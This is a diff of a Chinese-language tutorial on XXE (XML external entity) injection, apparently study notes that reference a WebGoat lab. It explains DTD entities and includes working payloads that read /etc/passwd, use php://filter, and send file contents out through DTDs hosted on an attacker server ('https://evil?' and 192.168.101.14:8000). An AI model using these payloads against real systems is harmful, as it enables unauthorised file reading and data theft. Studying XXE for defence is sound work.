@@ -21,7 +21,7 @@
 ```
 
 * 常用语法介绍：
-
+  
   * 元素声明：
     * \<!ELEMENT 元素名称 类别\>
     * \<!ELEMENT 元素名称 (元素内容)\>
@@ -30,7 +30,7 @@
   * 实体引用：这部分内部DOCTYPE和外部DOCTYPE引用
     * %引用：%test
     * &引用：&teamName
-
+  
   ```xml
   <?xml version="1.0" encoding="UTF-8" ?>
   <!DOCTYPE book [
@@ -39,7 +39,7 @@
   ]>
   <book>&teamName;</book>
   ```
-
+  
   ```xml
   <!-- 被引用的外部实体 -->
   <!ENTITY teamName SYSTEM "file:///etc/passwd">
@@ -85,7 +85,7 @@
 通过拓展还可以增加更多支持的协议
 
 * DTD-location：
-  * 本地文件读取：windows file:///c:/	linux file:///
+  * 本地文件读取：windows file:///c:/    linux file:///
   * 远程：http://、https://、ftp://
 
 #### XML参数
@@ -93,13 +93,13 @@
 在 XML 中，实体是用于表示文本片段的一种机制，允许在文档中引用、重复使用相同的文本。有两种类型的实体：通用实体（General Entities）和参数实体（Parameter Entities）。
 
 1. **通用实体（General Entities）：**
-
+   
    - **定义方式：** 通用实体通常用DTD中的 `<!ENTITY>` 声明进行定义。
-
+   
    - **使用范围：** 通用实体可以在文档的任何地方使用，包括元素内容、属性值和文档中的其他位置。
-
+   
    - **示例：**
-
+     
      ```
      xmlCopy code<!DOCTYPE example [
        <!ENTITY greeting "Hello, ">
@@ -109,17 +109,17 @@
        <message>&greeting;World!</message>
      </root>
      ```
-
+     
      在这个例子中，`&greeting;` 是一个通用实体，它被定义为字符串 "Hello, "，并在 `<message>` 元素中引用。
 
 2. **参数实体（Parameter Entities）：**
-
+   
    - **定义方式：** 参数实体通常用DTD中的 `<!ENTITY % name "value">` 声明进行定义。注意 `%` 符号用于区分通用实体和参数实体。
-
+   
    - **使用范围：** 参数实体主要用于定义在DTD内部，用于简化DTD的结构，提高可维护性和可重用性。参数实体不能在文档实例中引用，但可以在DTD内引用。
-
+   
    - **示例：**
-
+     
      ```
      xmlCopy code<!DOCTYPE example [
        <!ENTITY % greeting "Hello, ">
@@ -130,10 +130,10 @@
        <content>&message;</content>
      </root>
      ```
-
+     
      在这个例子中，`%greeting;` 是一个参数实体，被定义为 "Hello, "，然后 `%message;` 在DTD中使用了 `%greeting;` 来定义最终的文本 "Hello, World!"。
-   
    * 注意：
+     
      * **参数实体只能在外部DTD使用**
      * &xxe；这样的通用实体无法用于SYSTEM等关键字后的url拼接
 
@@ -239,29 +239,44 @@
 ```
 
 * 最终结果来看，我们的目的是要发起请求http://evil/?想要读取的内容
+
 * 想要读取的内容就是php://filter/read=convert.base64-encode/resource=target.txt，target是我们想要读取的文件内容，这里默认目标主机是php语言，采用了php的xml外部实体引用所支持的php伪协议，伪协议中的convert.base64-encode/resource是对目标文件进行base64编码，防止出现预定义字符而解析出错（这里也可采用下面的方法防止出现预定义字符）
 
-
-
 * 其他常用payload
+  
+  ```java
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % end "]]>">
+  <!ENTITY % evil "%start;%xxe;%end;">
+  <!ENTITY % dtd "<!ENTITY send SYSTEM 'https://evil?%evil;'>">
+  %dtd;
+  ```
 
- ```java
- <!ENTITY % start "<![CDATA[">
- <!ENTITY % xxe SYSTEM "file:///etc/passwd">
- <!ENTITY % end "]]>">
- <!ENTITY % evil "%start;%xxe;%end;">
- <!ENTITY % dtd "<!ENTITY send SYSTEM 'https://evil?%evil;'>">
- %dtd;
- ```
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % dtd SYSTEM "http://192.168.101.14:8000/attack_local.dtd">
+%dtd;
+%print;
+%send;
+]>
+<comment>  <text>cute</text></comment>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:///C:/Users/Administrator/.webgoat-8.1.0//XXE/secret.txt">
+<!ENTITY % print "<!ENTITY &#37; send SYSTEM 'http://192.168.101.14:8000/landing?text=%file;'>">
+```
 
 #### 要包含的目标文件有预定义字符
 
 ```xml
 <!DOCTYPE root [
-	<!ENTITY % start "<![CDATA[">
-	<!ENTITY % xxe SYSTEM "想要包含的文件">
-	<!ENTITY % end "]]>">
-	<!ENTITY % dtd SYSTEM "DTD url">
+    <!ENTITY % start "<![CDATA[">
+    <!ENTITY % xxe SYSTEM "想要包含的文件">
+    <!ENTITY % end "]]>">
+    <!ENTITY % dtd SYSTEM "DTD url">
 ]>
 
 <root>&evil;</root>
@@ -275,19 +290,20 @@
 * 采用之前谈到过的\<![CDATA[]]\>将包含预定义字符括起来
 
 * 注意：
-
+  
   * \<root\>&evil;\</root\>在进行解析时，如果&evil;包含的字符中有预定义字符，解析可能会出错
   * "%start;%xxe;%end;" 这种写法只有在外部实体才合法，所以这里没有直接写在内部DCOTYPE声明
   * 在xml文档中使用多个 &实体;  例如下面这个拼接不可行
-
+  
   ```xml
   <!DOCTYPE root [
-  	<!ENTITY  start "<![CDATA[">
-  	<!ENTITY  xxe SYSTEM "想要包含的文件">
-  	<!ENTITY  end "]]>">
+      <!ENTITY  start "<![CDATA[">
+      <!ENTITY  xxe SYSTEM "想要包含的文件">
+      <!ENTITY  end "]]>">
   ]>
   
   <root>&start;&xxe;&end;</root>
+  ```
 
 #### 后端对某些字符的过滤
 
